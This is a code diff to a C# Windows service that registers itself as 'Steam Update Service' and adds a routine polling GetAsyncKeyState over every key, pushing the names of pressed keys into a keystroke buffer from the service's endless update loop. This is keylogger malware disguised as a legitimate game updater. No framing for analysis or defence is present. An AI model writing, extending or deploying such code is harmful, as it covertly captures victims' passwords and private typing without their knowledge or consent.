@@ -17,7 +17,10 @@ namespace WindowsService
     class WindowsService : ServiceBase
     {
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        public static extern short GetAsyncKeyState(int vKey);
+        static extern short GetAsyncKeyState(int vKey);
+
+        [DllImport("user32.dll")]
+        static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); 
 
 
         public static readonly string Name = "Steam Update Service";
@@ -85,10 +88,29 @@ namespace WindowsService
             awaitingMsg = true;
         }
 
+        private static void CheckKeys()
+        {
+            bool found = false;
+            foreach (Int32 k in Enum.GetValues(typeof(Keys)))
+            {
+                int state = GetAsyncKeyState(k);
+                if (state == 1 || state == Int16.MinValue)
+                {
+                    PushMessage(Enum.GetName(typeof(Keys), k));
+                    found = true;
+                }
+            }
+
+            if (found)
+                awaitingMsg = true;
+        }
+
         private static void Update()
         {
             while (true)
             {
+                CheckKeys();
+
                 if (awaitingMsg == true)
                 {
                     lock (keystrokeBuf.SyncRoot)
